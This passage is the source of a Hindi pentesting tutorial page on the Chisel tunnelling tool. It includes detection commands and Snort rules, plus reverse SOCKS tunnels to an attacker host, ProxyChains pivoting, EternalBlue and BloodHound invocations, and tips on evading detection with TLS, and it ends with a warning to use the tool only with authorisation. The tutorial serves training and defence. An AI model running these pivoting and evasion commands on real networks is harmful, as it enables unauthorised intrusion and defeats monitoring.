        Chisel का HTTP टनल डिटेक्ट करना मुश्किल है लेकिन असंभव नहीं। निम्नलिखित तरीकों से पता लगाया जा सकता है। Defense-in-depth approach use करो — multiple layers of monitoring implement करो।
      </p>
      <CodeBlock
        title="डिटेक्शन कमांड्स"
        code={`# असामान्य HTTP कनेक्शंस चेक करो:
ss -tnp | grep ":80\|:443"
# एक ही IP से बहुत सारे connections suspicious हैं

# WebSocket upgrade requests detect करो:
tcpdump -i any "tcp port 80" -A | grep -i "upgrade: websocket"

# नेटवर्क ट्रैफ़िक वॉल्यूम मॉनिटर करो:
iftop -i eth0
# असामान्य traffic spikes देखो

# Firewall rules (iptables):
sudo iptables -A OUTPUT -p tcp --dport 80 -m connlimit --connlimit-above 10 -j DROP
# एक IP पर max 10 HTTP connections

# Snort/Suricata rules:
# alert tcp any any -> any 80 (msg:"Chisel WebSocket"; content:"Upgrade|3a| websocket"; sid:1000001;)`}
      />
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">WebSocket डिटेक्शन:</strong> HTTP अपग्रेड रिक्वेस्ट्स मॉनिटर करें — सामान्य HTTP में WebSocket दुर्लभ है</li>
        <li><strong className="text-white">ट्रैफ़िक पैटर्न:</strong> एक ही सोर्स से लगातार HTTP कनेक्शंस — असामान्य पैटर्न</li>
        <li><strong className="text-white">DPI:</strong> Deep Packet Inspection से HTTP पेलोड एनालाइज़ करें</li>
        <li><strong className="text-white">डेटा ट्रांसफ़र:</strong> असामान्य रूप से बड़ा डेटा ट्रांसफ़र HTTP पर</li>
        <li><strong className="text-white">एग्रेस रूल्स:</strong> केवल ज्ञात HTTP सर्विसेज़ की अनुमति दें</li>
        <li><strong className="text-white">TLS इंस्पेक्शन:</strong> एन्क्रिप्टेड टनल्स डिटेक्ट करें</li>
        <li><strong className="text-white">SIEM अलर्ट्स:</strong> असामान्य HTTP पोर्ट यूज़ के लिए अलर्ट रूल्स बनाएं</li>
        <li><strong className="text-white">नेटवर्क सेगमेंटेशन:</strong> इंटरनल नेटवर्क तक पहुंच सीमित करें</li>
        <li><strong className="text-white">आउटबाउंड कंट्रोल:</strong> केवल ज्ञात डेस्टिनेशंस की अनुमति</li>
        <li><strong className="text-white">एग्रेस/इंग्रेस एनालिसिस:</strong> असामान्य कनेक्शंस का पता लगाएं</li>
      </ul>

      <h2>Practical Workflow</h2>
      <p>
        पेनेट्रेशन टेस्टिंग में Chisel का टिपिकल वर्कफ़्लो:
      </p>
      <CodeBlock
        title="पेनटेस्ट वर्कफ़्लो"
        code={`# स्टेप 1: अटैकर पर सर्वर शुरू करें
chisel server -p 8080 --reverse --auth admin:secret123

# स्टेप 2: टार्गेट पर क्लाइंट अपलोड करें
# (वेब शेल, RCE, या अन्य तरीके से)

# स्टेप 3: टार्गेट से SOCKS प्रॉक्सी बनाएं
chisel client --auth admin:secret123 ATTACKER:8080 R:socks

# स्टेप 4: ProxyChains कॉन्फ़िग करें
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf

# स्टेप 5: इंटरनल नेटवर्क रेकन
proxychains nmap -sT -Pn 10.10.10.0/24

# स्टेप 6: इंटरनल सर्विसेज़ एक्सेस करें
proxychains ssh user@10.10.10.5
proxychains xfreerdp /u:user /p:pass /v:10.10.10.10

# स्टेप 7: पोर्ट फ़ॉरवर्डिंग (स्पेसिफ़िक सर्विसेज़ के लिए)
chisel client ATTACKER:8080 R:3333:10.10.10.5:3389 R:8080:10.10.10.10:80`}
      />

      <h2>Chisel Architecture Deep Dive</h2>
      <p>
        Chisel का आर्किटेक्चर समझना ज़रूरी है ताकि troubleshooting और optimization कर सको। यह Go में लिखा गया है और कई key components पर काम करता है:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">SSH Transport Layer:</strong> Chisel SSH प्रोटोकॉल का इस्तेमाल encryption के लिए करता है। यह Go की golang.org/x/crypto/ssh library पर based है। SSH handshake HTTP upgrade request के बाद होता है।</li>
        <li><strong className="text-white">HTTP Upgrade Mechanism:</strong> पहले HTTP request भेजी जाती है, फिर Connection: Upgrade header से SSH connection establish होता है। यह WebSocket upgrade जैसा ही है।</li>
        <li><strong className="text-white">Multiplexer:</strong> एक ही SSH connection पर कई channels open होते हैं। हर channel एक अलग tunnel represent करता है। यह बैंडविड्थ efficient है।</li>
        <li><strong className="text-white">SOCKS5 Implementation:</strong> Go की net/http library का SOCKS5 proxy implement करता है। CONNECT method support करता है। TCP और UDP दोनों handle करता है।</li>
        <li><strong className="text-white">LZ4 Compression:</strong> डेटा transfer के दौरान LZ4 compression apply होता है। यह CPU usage कम रखते हुए अच्छी compression ratio देता है।</li>
        <li><strong className="text-white">TLS Wrapper:</strong> TLS support optional है — --tls-key और --tls-cert flags से enable कर सकते हो। यह additional encryption layer add करता है SSH के ऊपर।</li>
        <li><strong className="text-white">Reconnection Logic:</strong> Client automatic reconnection attempt करता है connection drop होने पर। --max-retry-count और --max-retry-interval से configure कर सकते हो।</li>
        <li><strong className="text-white">Authentication Module:</strong> --auth flag से username:password based authentication enable होता है। यह SSH connection establish होने से पहले check होता है।</li>
      </ul>
      <p>
        Chisel की memory footprint बहुत कम है — typically 10-20MB RAM use करता है। CPU usage भी minimal है except data transfer के दौरान। यह embedded systems और low-resource environments में भी चल सकता है। Go का garbage collector automatic memory management करता है।
      </p>
      <p>
        Network perspective से, Chisel का traffic normal HTTP जैसा दिखता है। GET/POST requests HTTP headers के साथ जाती हैं। WebSocket upgrade request standard HTTP upgrade mechanism use करती है। DPI (Deep Packet Inspection) से बचने के लिए TLS ज़रूरी है। Without TLS, payload inspection से detect हो सकता है।
      </p>

      <h2>Chisel with ProxyChains Configuration</h2>
      <p>
        ProxyChains Chisel के साथ सबसे common combo है। ProxyChains का configuration सही होना ज़रूरी है वरना tools काम नहीं करेंगे।
      </p>
      <CodeBlock
        title="ProxyChains कॉन्फ़िग"
        code={`# ProxyChains कॉन्फ़िग फ़ाइल: /etc/proxychains.conf

# डिफ़ॉल्ट कॉन्फ़िग (strict_chain):
# strict_chain — सभी प्रॉक्सी sequential order में
# dynamic_chain — अगर एक प्रॉक्सी down है तो next try करो
# random_chain — random order में प्रॉक्सी

# Chisel SOCKS5 add करो:
[ProxyList]
socks5 127.0.0.1 1080

# कई SOCKS प्रॉक्सी (multi-hop):
[ProxyList]
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081

# ProxyChains से tools चलाओ:
proxychains nmap -sT -Pn 10.10.10.0/24
proxychains ssh user@10.10.10.5
proxychains xfreerdp /u:user /p:pass /v:10.10.10.10
proxychains curl http://10.10.10.5:8080
proxychains evil-winrm -i 10.10.10.5 -u admin -p pass

# DNS resolution through proxy:
proxychains dig @10.10.10.1 internal.corp.local

# Important: nmap में -sT use करो (TCP connect scan)
# -sS (SYN scan) ProxyChains पर काम नहीं करता`}
      />
      <CodeBlock
        title="ProxyChains ट्रबलशूटिंग"
        code={`# ProxyChains काम नहीं कर रहा:
# 1. SOCKS प्रॉक्सी चेक करो:
curl --socks5 127.0.0.1:1080 http://10.10.10.5
# अगर response मिले तो प्रॉक्सी काम कर रहा है

# 2. ProxyChains कॉन्फ़िग चेक करो:
cat /etc/proxychains.conf | grep -v "^#" | grep -v "^$"

# 3. dynamic_chain try करो:
# /etc/proxychains.conf में dynamic_chain uncomment करो

# 4. DNS leak prevent करो:
# proxy_dns uncomment करो कॉन्फ़िग में

# 5. Timeout issues:
# TCP connect timeout बढ़ाओ:
# tcp_read_time_out 15000
# tcp_connect_time_out 8000

# 6. Specific tools issues:
# Nmap: -sT -Pn mandatory है
# Metasploit: setg Proxies socks5:127.0.0.1:1080
# Browser: FoxyProxy extension use करो`}
      />

      <h2>Lab Environment Setup</h2>
      <p>
        Chisel प्रैक्टिस के लिए सेफ लैब बनाएं। VirtualBox या VMware में दो VMs बनाएं:
      </p>
      <CodeBlock
        title="लैब सेटअप"
        code={`# दो VMs बनाएं — अटैकर और टार्गेट
# दोनों में Chisel इंस्टॉल करें

# अटैकर VM (Kali Linux):
# 1. Chisel सर्वर शुरू करें
# 2. ProxyChains कॉन्फ़िग करें
# 3. इंटरनल नेटवर्क स्कैन करें

# टार्गेट VM (Ubuntu/Windows):
# 1. Chisel क्लाइंट से कनेक्ट करें
# 2. SOCKS प्रॉक्सी बनाएं
# 3. पोर्ट फ़ॉरवर्डिंग टेस्ट करें

# टेस्ट नेटवर्क:
# अटैकर: 10.10.14.5
# टार्गेट: 10.10.10.100
# इंटरनल: 10.10.10.0/24`}
      />
      <CodeBlock
        title="Docker लैब सेटअप"
        code={`# Docker से quick लैब बनाओ:

# Docker network बनाओ:
docker network create --subnet=10.10.10.0/24 chisel-lab

# टार्गेट कंटेनर:
docker run -d --name target --network chisel-lab --ip 10.10.10.100 ubuntu sleep infinity

# अटैकर कंटेनर:
docker run -d --name attacker --network chisel-lab --ip 10.10.14.5 -p 8080:8080 ubuntu sleep infinity

# दोनों में Chisel इंस्टॉल करो:
docker cp chisel attacker:/usr/local/bin/
docker cp chisel target:/usr/local/bin/

# अटैकर से सर्वर शुरू करो:
docker exec attacker chisel server -p 8080 --reverse

# टार्गेट से क्लाइंट कनेक्ट करो:
docker exec target chisel client 10.10.14.5:8080 R:socks

# यह quick लैब setup है — बिना VMs के`}
      />
      <CodeBlock
        title="प्रैक्टिस एक्सरसाइज़"
        code={`# एक्सरसाइज़ 1: बेसिक SOCKS प्रॉक्सी
# सर्वर शुरू करो, क्लाइंट कनेक्ट करो
# ProxyChains से nmap स्कैन करो

# एक्सरसाइज़ 2: पोर्ट फ़ॉरवर्डिंग
# टार्गेट के अंदर के वेबसर्वर तक पहुंचो
# ब्राउज़र में localhost:8080 से एक्सेस करो

# एक्सरसाइज़ 3: TLS टनल
# सर्टिफ़िकेट बनाओ, TLS सर्वर शुरू करो
# फ़िंगरप्रिंट वेरिफ़िकेशन के साथ कनेक्ट करो

# एक्सरसाइज़ 4: मल्टी-टनल
# एक साथ SOCKS और पोर्ट फ़ॉरवर्डिंग
# कई इंटरनल होस्ट्स तक पहुंचो

# एक्सरसाइज़ 5: ऑथेंटिकेशन
# --auth फ़्लैग से सर्विस सिक्योर करो
# बिना ऑथ के कनेक्शन फ़ेल होता है वेरिफ़ाई करो

# एक्सरसाइज़ 6: फ़ाइल ट्रांसफ़र
# बिल्ट-इन फ़ाइल सर्वर से टूल्स ट्रांसफ़र करो
# curl से डाउनलोड और अपलोड करो

# एक्सरसाइज़ 7: मल्टी-होप टनल
# दो Chisel सर्वर्स chain करो
# ProxyChains में दो SOCKS प्रॉक्सी add करो`}
      />

      <h2>Advanced Techniques</h2>
      <p>
        Chisel की एडवांस्ड फ़ीचर्स पेनेट्रेशन टेस्टिंग में बहुत काम आती हैं:
      </p>
      <CodeBlock
        title="TLS के साथ"
        code={`# सर्टिफ़िकेट बनाएं:
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# TLS सर्वर:
chisel server -p 443 --tls-key key.pem --tls-cert cert.pem --reverse

# TLS क्लाइंट (फ़िंगरप्रिंट वेरिफ़िकेशन):
chisel client --fingerprint SERVER_FINGERPRINT https://ATTACKER:443 R:socks

# ऑथेंटिकेशन:
# सर्वर:
chisel server -p 8080 --auth user:password --reverse

# क्लाइंट:
chisel client --auth user:password ATTACKER:8080 R:socks`}
      />
      <CodeBlock
        title="मल्टी-होप टनल"
        code={`# मल्टी-होप टनल — कई नोड्स के माध्यम से:
# होप 1: टार्गेट → मिडिल सर्वर
chisel client MIDDLE_SERVER:8080 R:socks

# होप 2: मिडिल सर्वर → फ़ाइनल टार्गेट
# ProxyChains कॉन्फ़िग में कई SOCKS प्रॉक्सी:
# socks5 127.0.0.1 1080
# socks5 127.0.0.1 1081

# यह डिटेक्शन को और मुश्किल बनाता है`}
      />
      <CodeBlock
        title="HTTP प्रॉक्सी के पीछे से"
        code={`# कॉर्पोरेट HTTP प्रॉक्सी के पीछे से कनेक्ट:
chisel client --proxy http://corporate-proxy:8080 ATTACKER:8080 R:socks

# SOCKS5 प्रॉक्सी के पीछे से:
chisel client --proxy socks5://proxy:1080 ATTACKER:8080 R:socks

# PID फ़ाइल और लॉग:
chisel server -p 8080 --reverse --pid /tmp/chisel.pid
chisel server -p 8080 --reverse > /var/log/chisel.log 2>&1

# बैकग्राउंड में चलाएं:
nohup chisel server -p 8080 --reverse &`}
      />

      <h2>Real-World Case Studies</h2>
      <p>
        Chisel रियल-वर्ल्ड पेनेट्रेशन टेस्टिंग में बहुत इस्तेमाल होता है। यहां कुछ उदाहरण हैं जहां Chisel ने रेड टीम ऑपरेशंस में अहम भूमिका निभाई:
      </p>
      <p>
        एक कॉर्पोरेट नेटवर्क पेनेट्रेशन टेस्ट में, टेस्टर ने वेब एप्लिकेशन वल्नरेबिलिटी से शेल प्राप्त किया। टार्गेट सर्वर एक DMZ में था और इंटरनल नेटवर्क से सीधा कनेक्शन नहीं था। Chisel के रिवर्स SOCKS प्रॉक्सी से टेस्टर ने इंटरनल नेटवर्क तक पहुंच बनाई और 10 इंटरनल सर्वर्स को एक्सेस किया। बिना Chisel के यह असंभव था क्योंकि फ़ायरवॉल SSH टनल ब्लॉक कर रहा था।
      </p>
      <p>
        एक अन्य केस में, रेड टीम ने फ़िशिंग से एंडपॉइंट पर एक्सेस प्राप्त किया। कॉर्पोरेट प्रॉक्सी सिर्फ HTTP/HTTPS आउटबाउंड ट्रैफ़िक अलाउ करता था। Chisel के --proxy फ़्लैग से टीम ने कॉर्पोरेट प्रॉक्सी के माध्यम से C2 सर्वर से कनेक्ट किया और पूरे नेटवर्क को कंप्रोमाइज़ किया। HTTP टनलिंग की वजह से कोई अलर्ट जनरेट नहीं हुआ।
      </p>
      <p>
        एक क्रिटिकल इंफ्रास्ट्रक्चर असेसमेंट में, ICS/SCADA नेटवर्क एयर-गैप्ड था। टेस्टर ने एक कंप्रोमाइज़्ड वर्कस्टेशन से Chisel मल्टी-होप टनल बनाई — पहले IT नेटवर्क तक, फिर OT नेटवर्क तक। दो हॉप्स के बाद SCADA सर्वर तक पहुंच मिल गई। यह टेक्निक एयर-गैप बायपास का क्लासिक उदाहरण है।
      </p>

      <h2>Integration with Other Tools</h2>
      <p>
        Chisel अकेले इस्तेमाल करने से ज़्यादा पावरफुल तब बनता है जब दूसरे टूल्स के साथ कॉम्बो में यूज़ करो। पेनेट्रेशन टेस्टिंग में टूल चेन बनाना ज़रूरी है — हर टूल का अपना स्ट्रेंथ है।
      </p>
      <CodeBlock
        title="Chisel + Nmap + Metasploit कॉम्बो"
        code={`# स्टेप 1: Chisel SOCKS प्रॉक्सी बनाओ
chisel server -p 8080 --reverse
# टार्गेट से: chisel client ATTACKER:8080 R:socks

# स्टेप 2: ProxyChains से Nmap स्कैन
proxychains nmap -sT -Pn -sV 10.10.10.0/24

# स्टेप 3: Metasploit through ProxyChains
proxychains msfconsole
# msf6 > use exploit/windows/smb/ms17_010_eternalblue
# msf6 > set RHOSTS 10.10.10.5
# msf6 > set LHOST 10.10.14.5
# msf6 > exploit

# स्टेप 4: BloodHound through ProxyChains
proxychains bloodhound-python -d corp.local -u user -p pass -dc dc01.corp.local -c All

# स्टेप 5: CrackMapExec through ProxyChains
proxychains crackmapexec smb 10.10.10.0/24 -u user -p pass`}
      />
      <CodeBlock
        title="Chisel + Burp Suite + Browser"
        code={`# इंटरनल वेब एप्लिकेशन टेस्टिंग

# Chisel SOCKS प्रॉक्सी:
chisel server -p 8080 --reverse
# टार्गेट से: chisel client ATTACKER:8080 R:socks

# Burp Suite में SOCKS प्रॉक्सी सेट करो:
# Project Options → Connections → SOCKS Proxy
# Host: 127.0.0.1, Port: 1080

# Firefox में proxy सेट करो:
# about:preferences → Network Settings → Manual Proxy
# SOCKS Host: 127.0.0.1, Port: 1080, SOCKS v5

# अब इंटरनल वेबसाइट ब्राउज़ करो:
# http://10.10.10.5:8080
# Burp में ट्रैफ़िक दिखेगा — इंटरनल ऐप्स भी`}
      />

      <h2>Performance Tuning</h2>
      <p>
        Chisel की परफॉर्मेंस ऑप्टिमाइज़ करने के लिए कई टेक्निक्स हैं। बड़े डेटा ट्रांसफर और हाई-लेटेंसी नेटवर्क में ये सेटिंग्स बहुत मायने रखती हैं।
      </p>
      <CodeBlock
        title="परफॉर्मेंस ऑप्टिमाइज़ेशन"
        code={`# कंप्रेशन डिसेबल करो (CPU बचाओ):
chisel server -p 8080 --reverse --compress=false

# कंप्रेशन लेवल सेट करो:
chisel server -p 8080 --reverse --compress=true

# keepalive इंटरवल एडजस्ट करो:
chisel server -p 8080 --reverse --keepalive 10s

# मैक्स रीकनेक्ट कॉन्फ़िग:
chisel client ATTACKER:8080 --max-retry-count 100 --max-retry-interval 5s R:socks

# कई क्लाइंट्स एक साथ:
# हर टार्गेट से अलग-अलग SOCKS पोर्ट:
chisel client ATTACKER:8080 R:socks  # पोर्ट 1080
chisel client ATTACKER:8080 R:1081:socks  # पोर्ट 1081

# बैंडविड्थ मॉनिटर:
# Linux: iftop -i tun0
# General: nload, bmon`}
      />

      <h2>Reporting and Output Analysis</h2>
      <p>
        पेनेट्रेशन टेस्टिंग में रिपोर्टिंग ज़रूरी है — Chisel के टनल और ट्रैफ़िक को लॉग और एनालाइज़ करना सीखो। क्लाइंट को दिखाना पड़ता है कि क्या-क्या एक्सेस हो सकता था।
      </p>
      <CodeBlock
        title="लॉगिंग और डॉक्यूमेंटेशन"
        code={`# सर्वर लॉग फ़ाइल में सेव करो:
chisel server -p 8080 --reverse 2>&1 | tee chisel-server.log

# क्लाइंट लॉग:
chisel client ATTACKER:8080 R:socks 2>&1 | tee chisel-client.log

# नेटवर्क स्कैन रिज़ल्ट सेव करो:
proxychains nmap -sT -Pn 10.10.10.0/24 -oN internal-scan.txt

# पोर्ट फ़ॉरवर्डिंग डॉक्यूमेंट करो:
echo "=== Chisel Tunnels ===" > report.txt
echo "SOCKS5: 127.0.0.1:1080" >> report.txt
echo "RDP: localhost:3333 → 10.10.10.5:3389" >> report.txt
echo "Web: localhost:8080 → 10.10.10.10:80" >> report.txt
echo "SSH: localhost:2222 → 10.10.10.20:22" >> report.txt

# tcpdump से टनल ट्रैफ़िक कैप्चर:
sudo tcpdump -i any port 8080 -w chisel-traffic.pcap

# वेरिफ़ाई करो कि टनल काम कर रही है:
curl --socks5 127.0.0.1:1080 http://10.10.10.5:80
# अगर HTML मिले तो टनल काम कर रही है`}
      />
      <CodeBlock
        title="टनल मॉनिटरिंग स्क्रिप्ट"
        code={`#!/bin/bash
# Chisel टनल हेल्थ मॉनिटर

echo "[*] Chisel टनल स्टेटस चेक..."
echo ""

# SOCKS प्रॉक्सी चेक:
if curl --socks5 127.0.0.1:1080 --connect-timeout 5 http://10.10.10.5:80 > /dev/null 2>&1; then
    echo "[+] SOCKS5 प्रॉक्सी: काम कर रहा है"
else
    echo "[-] SOCKS5 प्रॉक्सी: काम नहीं कर रहा"
fi

# पोर्ट फ़ॉरवर्ड चेक:
for PORT in 3333 4444 8080 2222; do
    if nc -z 127.0.0.1 $PORT 2>/dev/null; then
        echo "[+] पोर्ट $PORT: खुला है"
    else
        echo "[-] पोर्ट $PORT: बंद है"
    fi
done

# कनेक्शन काउंट:
echo ""
echo "[*] एक्टिव कनेक्शंस:"
ss -tnp | grep chisel | wc -l
echo " कनेक्शंस एक्टिव हैं"`}
      />

      <h2>Frequently Asked Questions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'क्या Chisel फ्री है?', a: 'हाँ, पूरी तरह फ्री और ओपन सोर्स (MIT लाइसेंस)। GitHub पर उपलब्ध है।' },
          { q: 'SSH टनल से बेहतर क्यों है?', a: 'HTTP पर चलता है — ज़्यादातर फ़ायरवॉल्स HTTP ब्लॉक नहीं करते। SSH बहुत जगह ब्लॉक है। एक ही कनेक्शन पर कई टनल चलती हैं (मल्टीप्लेक्सिंग)।' },
          { q: 'क्या एक ही कनेक्शन पर कई टनल चल सकती हैं?', a: 'हाँ, मल्टीप्लेक्सिंग सपोर्ट है। एक ही HTTP कनेक्शन पर कई टनल चलती हैं — बैंडविड्थ बचती है।' },
          { q: 'Windows पर चलता है?', a: 'हाँ! Go में लिखा है — Windows, Linux, macOS, ARM सभी पर चलता है। एक ही बाइनरी सर्वर और क्लाइंट दोनों के लिए।' },
          { q: 'क्या UDP टनल सपोर्ट है?', a: 'हाँ, UDP पोर्ट फ़ॉरवर्डिंग सपोर्ट है। R:udp/53:target:53 जैसे सिंटैक्स यूज़ करो। DNS, VoIP जैसे प्रोटोकॉल्स के लिए।' },
          { q: 'डिटेक्शन से बचने के लिए क्या करें?', a: 'TLS यूज़ करो, नॉर्मल HTTP पोर्ट (80/443) पर चलाओ, --keepalive से ट्रैफ़िक पैटर्न नॉर्मल रखो।' },
          { q: 'क्या Chisel फ़ाइल ट्रांसफ़र कर सकता है?', a: 'हाँ, बिल्ट-इन फ़ाइल सर्वर है। R:8888:127.0.0.1:8080 से फ़ाइलें शेयर कर सकते हो।' },
          { q: 'रीकनेक्ट ऑटोमैटिक होता है?', a: 'हाँ, डिफ़ॉल्ट में 3 बार ट्राई करता है। --max-retry-count से बढ़ा सकते हो।' },
          { q: 'क्या कई क्लाइंट्स एक सर्वर से कनेक्ट कर सकते हैं?', a: 'हाँ, Chisel सर्वर मल्टीप्लेक्सिंग सपोर्ट करता है। कई क्लाइंट्स एक साथ कनेक्ट कर सकते हैं।' },
          { q: 'टनल की स्पीड कितनी है?', a: 'नेटवर्क पर डिपेंड करता है। LZ4 कंप्रेशन डिफ़ॉल्ट में ऑन है। लोकल नेटवर्क पर Gbps स्पीड मिल सकती है।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Alternatives</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">टूल</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">खासियत</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">SSH Tunnel</td><td className="py-2 px-3">पोर्ट फ़ॉरवर्डिंग</td><td className="py-2 px-3">बिल्ट-इन, सिंपल, हर जगह उपलब्ध</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">ngrok</td><td className="py-2 px-3">टनलिंग सर्विस</td><td className="py-2 px-3">क्लाउड-बेस्ड, आसान, लेकिन पेड</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">frp</td><td className="py-2 px-3">फ़ास्ट रिवर्स प्रॉक्सी</td><td className="py-2 px-3">हाई परफॉर्मेंस, YAML कॉन्फ़िग</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">socat</td><td className="py-2 px-3">स्विस आर्मी नाइफ़</td><td className="py-2 px-3">वर्सटाइल लेकिन कॉम्प्लेक्स</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">ligolo-ng</td><td className="py-2 px-3">रिवर्स टनल</td><td className="py-2 px-3">मॉडर्न, Go-बेस्ड, TUN इंटरफ़ेस</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">rathole</td><td className="py-2 px-3">NAT ट्रैवर्सल</td><td className="py-2 px-3">Rust-बेस्ड, हाई परफॉर्मेंस</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">cloudflared</td><td className="py-2 px-3">Cloudflare टनल</td><td className="py-2 px-3">CDN-बेस्ड, फ्री, लेकिन क्लाउड डिपेंडेंट</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">bore</td><td className="py-2 px-3">सिंपल टनल</td><td className="py-2 px-3">Rust-बेस्ड, मिनिमलिस्ट</td></tr>
          </tbody>
        </table>
      </div>

      <div className="info-box mt-6">
        <strong>💡 Pro Tips:</strong>
        <ul className="list-disc list-inside mt-2 space-y-1">
          <li>Chisel + ProxyChains सबसे पावरफुल कॉम्बो है — रिवर्स SOCKS प्रॉक्सी से पूरे इंटरनल नेटवर्क तक पहुंच</li>
          <li>HTTP टनल से फ़ायरवॉल्स बायपास होते हैं — port 80/443 पर चलाओ</li>
          <li>TLS यूज़ करो — डिटेक्शन से बचोगे, HTTPS ज़्यादातर जगह खुला होता है</li>
          <li>--auth फ़्लैग से सर्विस सिक्योर करो — बिना ऑथ के कोई भी कनेक्ट कर सकता है</li>
          <li>--keepalive 30 लगाओ — कनेक्शन स्टेबल रहेगा</li>
          <li>मल्टी-टनल यूज़ करो — एक ही कमांड में SOCKS + पोर्ट फ़ॉरवर्डिंग</li>
          <li>फ़ाइल सर्वर से टूल्स ट्रांसफ़र करो — wget/curl नहीं होने पर काम आता है</li>
          <li>UDP टनल भी सपोर्ट है — DNS और VoIP के लिए R:udp/53:target:53 यूज़ करो</li>
        </ul>
      </div>

      <h2>Quick Reference Card</h2>
      <p>
        पेनेट्रेशन टेस्टिंग के दौरान Chisel की सबसे ज़्यादा इस्तेमाल होने वाली कमांड्स का quick reference:
      </p>
      <CodeBlock
        title="Quick Reference Commands"
        code={`# बेसिक सर्वर शुरू करो:
chisel server -p 8080 --reverse

# बेसिक SOCKS प्रॉक्सी:
chisel client ATTACKER:8080 R:socks

# पोर्ट फ़ॉरवर्डिंग:
chisel client ATTACKER:8080 R:3333:target:3389

# ऑथ के साथ सर्वर:
chisel server -p 8080 --reverse --auth user:pass

# TLS सर्वर:
chisel server -p 443 --tls-key key.pem --tls-cert cert.pem

# मल्टीप्लेक्सिंग:
chisel client ATTACKER:8080 R:socks R:3333:target:3389 R:8080:target:80

# वर्शन चेक:
chisel --version`}
      />

      <div className="warning-box mt-6">
        <strong>⚠️ फाइनल वार्निंग:</strong> Chisel एक शक्तिशाली टनलिंग टूल है। इसका इस्तेमाल केवल अधिकृत पेनेट्रेशन टेस्टिंग और सुरक्षा शोध के लिए करें। बिना अनुमति के नेटवर्क टनल बनाना और फ़ायरवॉल बायपास करना अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत नेटवर्क एक्सेस अपराध हो सकता है। केवल अपने लैब या लिखित अनुमति के साथ ही उपयोग करें।
      </div>
    </TutorialLayout>
  )
}
